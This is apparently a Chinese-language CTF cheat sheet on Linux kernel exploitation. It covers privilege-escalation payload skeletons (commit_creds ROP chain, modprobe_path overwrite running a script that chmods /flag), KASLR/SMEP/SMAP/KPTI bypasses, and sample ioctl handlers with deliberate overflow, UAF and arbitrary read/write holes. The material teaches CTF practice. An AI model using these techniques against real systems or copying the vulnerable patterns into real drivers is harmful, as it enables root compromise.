# Kernel Pwn

## 原理

内核漏洞利用，通过内核模块的漏洞（如缓冲区溢出、UAF、整数溢出等）提权到 root，读取 flag。

## 攻击链

### 1. 信息收集

```bash
# 内核版本
uname -r
# 内核配置
cat /proc/config.gz | zcat | grep -E "CONFIG_USER_NS|CONFIG_BPF|CONFIG_USERFAULTFD"
# 保护机制
cat /proc/cmdline
# KASLR: nokaslr 关闭
# SMEP: nosmep 关闭
# SMAP: nosmap 关闭
# KPTI: nopti 关闭

# 模块信息
lsmod
modinfo ./module.ko
# 模块中的漏洞
# checksec ./module.ko
```

### 2. 漏洞分析

```bash
# 反编译模块
ghidra ./module.ko
ida ./module.ko

# 常见漏洞
# 1. ioctl 缓冲区溢出
# 2. UAF
# 3. 整数溢出
# 4. 竞态条件
# 5. 任意地址读写
```

### 3. 提权方法

#### commit_creds(prepare_kernel_cred(0))

```c
// 经典提权
commit_creds(prepare_kernel_cred(0));
// 然后返回用户态
```

```python
from pwn import *

# 1. 保存用户态寄存器
# 2. 触发漏洞
# 3. 在内核态调用 commit_creds(prepare_kernel_cred(0))
# 4. 返回用户态
# 5. system("/bin/sh")

# 保存状态
save_state = """
    mov user_cs, cs
    mov user_ss, ss
    mov user_sp, rsp
    pushf
    pop user_rflags
"""

# 提权函数
def escalate():
    payload = b'A' * offset
    payload += p64(prepare_kernel_cred)
    payload += p64(commit_creds_pop_rdi)  # pop rdi; ret; mov rdi, rax; ...
    payload += p64(0)  # arg
    payload += p64(swapgs_restore)  # 返回用户态
    return payload
```

#### modprobe_path 覆盖

```python
# 1. 泄露内核基址
# 2. 通过任意写覆盖 modprobe_path
# 3. 触发 modprobe
# 4. 执行任意脚本

# modprobe_path 默认为 /sbin/modprobe
# 覆盖为 /tmp/x
modprobe_path = kernel_base + 0x...
write(modprobe_path, b'/tmp/x\x00')

# /tmp/x 内容
# #!/bin/sh
# chmod 777 /flag

# 触发 modprobe
# 执行一个未知格式的二进制
open('/tmp/dummy', 'w').write('\xff\xff\xff\xff')
os.chmod('/tmp/dummy', 0o777)
os.system('/tmp/dummy')
```

#### poweroff_cmd 覆盖

```python
# 类似 modprobe_path
# 覆盖 poweroff_cmd
# 触发 poweroff
```

### 4. 绕过保护

#### KASLR

```python
# 1. 信息泄露
#    - dmesg 泄露
#    - /proc/kallsyms（需要 root 或 kptr_restrict=0）
#    - 内核模块泄露
# 2. 侧信道
#    - 时序攻击
#    - prefetch
```

#### SMEP (Supervisor Mode Execution Prevention)

```python
# 内核态不能执行用户态代码
# 绕过：
# 1. ROP
# 2. JOP
# 3. 内核中的代码片段
# 4. 覆盖 CR4 寄存器（需要 native_write_cr4）
```

#### SMAP (Supervisor Mode Access Prevention)

```python
# 内核态不能访问用户态数据
# 绕过：
# 1. 内核 ROP
# 2. copy_from_user/copy_to_user
# 3. 覆盖 CR4 寄存器
```

#### KPTI (Kernel Page Table Isolation)

```python
# 内核页表与用户态页表隔离
# 绕过：
# 1. 使用 KPTI trampoline
# 2. swapgs_restore_regs_and_return_to_usermode
```

### 5. 返回用户态

```python
# 1. swapgs
# 2. iretq

# 或使用 KPTI trampoline
swapgs_restore = kernel_base + 0x...
payload += p64(swapgs_restore + offset)  # 跳过 swapgs
```

## 常见内核漏洞

### 1. ioctl 缓冲区溢出

```c
// 内核模块
static long device_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    char buf[0x100];
    copy_from_user(buf, (void *)arg, 0x1000);  // 溢出
    return 0;
}
```

### 2. UAF

```c
// 内核模块
static long device_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    struct obj *ptr = kmalloc(sizeof(struct obj), GFP_KERNEL);
    kfree(ptr);
    // ptr 仍可用
    ptr->func();  // UAF
    return 0;
}
```

### 3. 任意地址读写

```c
// 内核模块
static long device_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    struct req req;
    copy_from_user(&req, (void *)arg, sizeof(req));
    if (req.op == 1) {
        // 任意读
        copy_to_user((void *)req.addr, (void *)req.target, req.size);
    } else {
        // 任意写
        copy_from_user((void *)req.target, (void *)req.addr, req.size);
    }
    return 0;
}
```

### 4. 竞态条件

```c
// 内核模块
static long device_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    // check
    if (check(arg)) {
        // use
        // 竞态窗口
        do_something(arg);
    }
    return 0;
}
```

## 2024-2026 新技术点

### 1. eBPF 漏洞

```python
# eBPF 是内核中的 JIT 编译器
# 越来越多的内核功能使用 eBPF
# eBPF 验证器漏洞
# eBPF JIT 漏洞
```

### 2. io_uring 漏洞

```python
# io_uring 是高性能 IO 框架
# 复杂的内核接口
# 多个 CVE
# CVE-2024-0582
# CVE-2024-0580
```

### 3. userfaultfd 利用

```python
# userfaultfd 可以暂停内核执行
# 用于扩大竞态窗口
# 用于堆喷射
```

### 4. 新型提权方法

```python
# 1. modprobe_path
# 2. poweroff_cmd
# 3. core_pattern
# 4. cred 结构覆盖
# 5. task_struct 覆盖
```

### 5. 容器逃逸

```python
# 容器环境中的内核利用
# 通过内核漏洞逃逸容器
# CVE-2022-0185
# CVE-2022-0492
# CVE-2024-21626
```

### 6. 硬件级防护

```python
# Intel CET
# ARM PAC/BTI
# ARM MTE
# 影响内核利用
```

### 7. 沙箱绕过

```python
# seccomp 限制
# 通过内核漏洞绕过
```

### 8. 新型利用链

```python
# 持续有新的内核利用链被发现
# 关注最新研究
```

### 9. ARM64 内核

```python
# ARM64 架构内核
# 不同的保护机制
# 不同的利用方法
```

### 10. RISC-V 内核

```python
# RISC-V 架构内核
# 新的架构
# 新的利用方法
```

## 工具推荐

- **pwntools** — Python 利用框架
- **gdb + pwndbg** — 动态调试
- **vmlinux-to-elf** — 提取内核符号
- **extract-vmlinux** — 提取 vmlinux
- **ropper** — ROP gadget 查找
- **kernel-exploit-factory** — 内核漏洞利用集合

## 参考链接

- [ctf-wiki kernel pwn](https://ctf-wiki.org/pwn/linux/kernel-mode/)
- [Kernel Exploitation](https://blog.k3170makan.com/2018/09/kernel-exploitation-privilege.html)
- [Linux Kernel Exploit](https://github.com/bsauce/kernel-exploit)
- [kernel pwn notes](https://www.jianshu.com/p/4d7d7a460c0c)
